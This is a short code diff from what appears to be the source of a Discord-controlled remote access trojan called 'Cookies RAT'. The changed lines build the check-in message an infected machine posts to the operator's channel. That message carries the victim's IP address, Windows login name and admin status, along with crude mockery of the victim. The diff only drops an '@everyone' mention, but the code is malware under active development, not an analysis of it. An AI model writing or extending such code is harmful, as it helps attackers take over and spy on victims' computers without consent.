@@ -124,7 +124,7 @@ async def on_ready():
     channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
     channel = client.get_channel(channel_.id)
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    value1 = f"@everyone **{channel_name}** | IP: **||{ip}||**\n> Some dumbass named **`{os.getlogin()}`** ran Cookies RAT start fucking there shit up!"
+    value1 = f"**{channel_name}** | IP: **||{ip}||**\n> Some dumbass named **`{os.getlogin()}`** ran Cookies RAT start fucking there shit up!"
     if is_admin == True:
         await channel.send(f'{value1} with **`admin`** perms sheeeeeeeeesh')
     elif is_admin == False:
